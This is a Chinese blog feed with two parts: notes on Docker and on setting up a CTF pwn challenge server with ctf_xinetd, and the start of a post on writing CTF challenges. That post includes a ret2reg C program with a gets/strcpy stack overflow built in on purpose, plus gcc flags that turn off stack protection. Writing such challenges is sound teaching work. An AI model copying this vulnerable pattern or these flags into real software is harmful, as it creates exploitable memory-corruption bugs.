&lt;p&gt;&lt;a href=&#34;https://yeasy.gitbook.io/docker_practice/&#34;&gt;https://yeasy.gitbook.io/docker_practice/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;一、安装&#34;&gt;&lt;a href=&#34;#一、安装&#34; class=&#34;headerlink&#34; title=&#34;一、安装&#34;&gt;&lt;/a&gt;一、安装&lt;/h2&gt;&lt;p&gt;使用官方脚本安装docker&lt;/p&gt;
&lt;p&gt;curl -fsSL &lt;a href=&#34;https://get.docker.com/&#34;&gt;https://get.docker.com&lt;/a&gt; | bash -s docker –mirror Aliyun&lt;/p&gt;
&lt;p&gt;手动安装(不如脚本稳定少出错)&lt;/p&gt;
&lt;p&gt;开启docker &lt;/p&gt;
&lt;p&gt;systemctl enable docker &lt;/p&gt;
&lt;p&gt;systemctl start docker&lt;/p&gt;
&lt;p&gt;测试是否安装成功: docker run –rm hello-world&lt;/p&gt;
&lt;p&gt;hello-world是测试容器, –rm表示退出容器后,自动删除容器&lt;/p&gt;
&lt;h2 id=&#34;二、使用入门&#34;&gt;&lt;a href=&#34;#二、使用入门&#34; class=&#34;headerlink&#34; title=&#34;二、使用入门&#34;&gt;&lt;/a&gt;二、使用入门&lt;/h2&gt;&lt;h3 id=&#34;1-镜像&#34;&gt;&lt;a href=&#34;#1-镜像&#34; class=&#34;headerlink&#34; title=&#34;1.镜像&#34;&gt;&lt;/a&gt;1.镜像&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;docker images 查看本地镜像&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;docker pull xxxx 拉去镜像, 例如docker pull ubuntu:18.04&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​		不给镜像仓库地址的话, 会从 Docker Hub （&lt;code&gt;docker.io&lt;/code&gt;）获取镜像, 而镜像名称是 &lt;code&gt;ubuntu:18.04&lt;/code&gt;，因此将会获取官方镜像 &lt;code&gt;library/ubuntu&lt;/code&gt; 仓库中标签为 &lt;code&gt;18.04&lt;/code&gt; 的镜像。&lt;code&gt;docker pull&lt;/code&gt;命令的输出结果最后一行给出了镜像的完整名称，例如： &lt;code&gt;docker.io/library/ubuntu:18.04&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;docker rmi xxxx  删除镜像&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;docker build -t xxxx .  用dockerfile构建镜像&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-容器&#34;&gt;&lt;a href=&#34;#2-容器&#34; class=&#34;headerlink&#34; title=&#34;2.容器&#34;&gt;&lt;/a&gt;2.容器&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;docker ps 查看容器 -a查看所有(包括停止的)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;docker run -it ubuntu:18.04 bash&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	-it: -i 交互式操作 -t 终端 &lt;/p&gt;
&lt;p&gt;​	bash 命令,希望有交互式shell,所以用这个,或者&amp;#x2F;bin&amp;#x2F;sh之类的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;docker stop xxx  停止容器&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;CTF-pwn出题环境搭建&#34;&gt;&lt;a href=&#34;#CTF-pwn出题环境搭建&#34; class=&#34;headerlink&#34; title=&#34;CTF-pwn出题环境搭建&#34;&gt;&lt;/a&gt;CTF-pwn出题环境搭建&lt;/h1&gt;&lt;p&gt;​		pwn出题主要用到了 &lt;a href=&#34;https://github.com/Eadom/ctf_xinetd&#34;&gt;https://github.com/Eadom/ctf_xinetd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;环境搭建&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_53757397/article/details/128489015&#34;&gt;https://blog.csdn.net/weixin_53757397/article/details/128489015&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/mylyylmy/article/details/79917776&#34;&gt;https://blog.csdn.net/mylyylmy/article/details/79917776&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/&#34;&gt;https://nocbtm.github.io/2019/09/25/pwn题的搭建/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_53757397/article/details/128489015&#34;&gt;https://blog.csdn.net/weixin_53757397/article/details/128489015&lt;/a&gt; 感觉有点啰嗦,不一定需要上传docker仓库&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_46521144/article/details/120572274&#34;&gt;https://blog.csdn.net/weixin_46521144/article/details/120572274&lt;/a&gt; 排错&lt;/p&gt;
&lt;h2 id=&#34;搭建步骤&#34;&gt;&lt;a href=&#34;#搭建步骤&#34; class=&#34;headerlink&#34; title=&#34;搭建步骤&#34;&gt;&lt;/a&gt;搭建步骤&lt;/h2&gt;&lt;p&gt;git clone &lt;a href=&#34;https://github.com/Eadom/ctf_xinetd.git&#34;&gt;https://github.com/Eadom/ctf_xinetd.git&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将编译好的libc、flag、题目文件拷贝到bin目录下&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​		如果需要特定的libc&lt;/p&gt;
&lt;p&gt;​		提前patchelf好,把libc文件页拷贝到ctf_xinetd的bin目录下&lt;/p&gt;
&lt;p&gt;​		patchelf –set-interpreter .&amp;#x2F;2.31-0ubuntu9_amd64&amp;#x2F;ld-linux-x86-64.so.2 .&amp;#x2F;timu&lt;br&gt;​		patchelf –set-rpath .&amp;#x2F;2.31-0ubuntu9_amd64&amp;#x2F; .&amp;#x2F;timu&lt;/p&gt;
&lt;p&gt;​		用绝对路径不知道为什么不行????&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;创建docker-compose.yml文件,这里的3389改成题目要映射的端口(物理机的),9999是docker里面的端口,image名字要和后面创建的docker images名字一样&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;version: &amp;#x27;3&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;services:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pwn:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        build: ./&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        image: pwn1 #这里修改的是images名,将和 docker build -t &amp;quot;pwn1&amp;quot; . 该命令有关&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ports:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            - &amp;quot;3389:9999&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pids_limit: 1024&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # cpus: 0.5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        restart: unless-stopped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # privileged: true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Dockerfile&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;FROM ubuntu:&lt;span class=&#34;number&#34;&gt;22.04&lt;/span&gt; 根据情况修改版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RUN cp -R /lib* /home/ctf &amp;amp;&amp;amp;\  版本高于&lt;span class=&#34;number&#34;&gt;18.04&lt;/span&gt;要删除这一句??为啥呢??&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	cp -R /usr/lib* /home/ctf &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;ctf.xinetd&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service ctf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    disable = no&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    socket_type = stream&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protocol    = tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wait        = no&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    user        = root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    type        = UNLISTED&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    port        = &lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bind        = &lt;span class=&#34;number&#34;&gt;0.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server      = /usr/sbin/chroot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;# replace helloworld to your program&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server_args = --userspec=&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt; /home/ctf ./timu   这里timu是题目bin文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    banner_fail = /etc/banner_fail&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;# safety options&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    per_source	= &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;# the maximum instances of this service per source IP address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rlimit_cpu	= &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;# the maximum number of CPU seconds that the service may use&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    #rlimit_as  = &lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;M &lt;span class=&#34;meta&#34;&gt;# the Address Space resource limit for the service&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    #access_times = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-9&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;制作镜像&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​		建立容器,pwn1名字就是镜像的名字&lt;/p&gt;
&lt;figure class=&#34;highlight erlang&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker build -t &lt;span class=&#34;string&#34;&gt;&amp;quot;pwn1&amp;quot;&lt;/span&gt; .&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;4.创建运行容器&lt;/p&gt;
&lt;p&gt;​		docker run -d -p 0.0.0.0:3389:9999 pwn1 运行容器,这里就部署好了,可以进行打了,3389是暴露出来的端口&lt;/p&gt;
&lt;p&gt;​		docker exec -it 16a224caf905 &amp;#x2F;bin&amp;#x2F;bash  和容器进行交互,(这个是退出后再次进入,和run时候-it不一样)&lt;/p&gt;
&lt;p&gt;文件拷贝 &lt;a href=&#34;https://blog.csdn.net/sunhuaqiang1/article/details/88354410&#34;&gt;https://blog.csdn.net/sunhuaqiang1/article/details/88354410&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;docker cp &amp;#x2F;root&amp;#x2F;chuti&amp;#x2F;uaf&amp;#x2F;timu pwncp:&amp;#x2F;home&amp;#x2F;ctf&amp;#x2F;timu&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/yue7603835/article/details/122456650&#34;&gt;https://blog.csdn.net/yue7603835/article/details/122456650&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <category term="docker" />
        <updated>2023-09-16T05:30:16.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/</id>
        <title>pwn入门-38-月赛出题3道</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/"/>
        <content type="html">&lt;p&gt;​		例行月赛出题，出了三道，两道是基于自己做过的题，融合了其他知识点（缝缝补补又一年），还有一道是临时出的凑数的。感觉确实不仅需要做题，也需要出题，出题的时候才能更好地理解出题人的想法（废话。。），以及注意到之前的很多细节。&lt;/p&gt;
&lt;p&gt;​		这次也踩坑踩了很多，比如条件竞争的题目，不知道怎么部署。。。想了很多方案都不行。以及docker容器自身的问题，它只是隔离了进程，并没有用新的内核，所以一些内核特性用不了。&lt;/p&gt;
&lt;h1 id=&#34;ret2reg&#34;&gt;&lt;a href=&#34;#ret2reg&#34; class=&#34;headerlink&#34; title=&#34;ret2reg&#34;&gt;&lt;/a&gt;ret2reg&lt;/h1&gt;&lt;h2 id=&#34;题目源码&#34;&gt;&lt;a href=&#34;#题目源码&#34; class=&#34;headerlink&#34; title=&#34;题目源码&#34;&gt;&lt;/a&gt;题目源码&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;evilfunction&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *input)&lt;/span&gt; &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buffer[&lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;];    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(buffer, input);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; input[&lt;span class=&#34;number&#34;&gt;580&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;welcome to here,please give me something&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets(input);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    evilfunction(input);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h2 id=&#34;分析&#34;&gt;&lt;a href=&#34;#分析&#34; class=&#34;headerlink&#34; title=&#34;分析&#34;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;​		本身这道题的原题是没有开启随机化，相对比较简单，可以直接写shellcode，然后call eax这种过去执行shellcode，但是如果开了随机化，call eax的地址就不确定了，&lt;font color=&#34;red&#34;&gt;但是可以进行枚举，（之前一直不会写枚举的脚本，这次学会了。。。）感觉之前有时候也是成功了,但是没有正确停止或打印&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		PIE和ALSR:&lt;/p&gt;
&lt;p&gt;ALSR:&amp;#x2F;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;randomize_va_spac  完全开启时 栈、堆、libc变化,程序本身及PLT不变&lt;/p&gt;
&lt;p&gt;PIE:可执行程序的加载基址&lt;/p&gt;
&lt;p&gt;​		在作者那个年代,应该是默认不开启PIE的,现在都是默认开启… 不开启的话,就很容易了,alsr不影响,所以做的时候有点怪怪的…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector -no-pie
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;objdump -d ret2reg&lt;/p&gt;
&lt;p&gt;804901d&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230916141427362.png&#34; alt=&#34;image-20230916141427362&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230916141359497.png&#34; alt=&#34;image-20230916141359497&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;开启PIE&#34;&gt;&lt;a href=&#34;#开启PIE&#34; class=&#34;headerlink&#34; title=&#34;开启PIE&#34;&gt;&lt;/a&gt;开启PIE&lt;/h2&gt;&lt;p&gt;​		进行枚举, 随机化程度是多少呢??&lt;/p&gt;
&lt;h2 id=&#34;踩坑-改为用户输入&#34;&gt;&lt;a href=&#34;#踩坑-改为用户输入&#34; class=&#34;headerlink&#34; title=&#34;踩坑,改为用户输入&#34;&gt;&lt;/a&gt;踩坑,改为用户输入&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;evilfunction&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *input)&lt;/span&gt; &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buffer[&lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;];    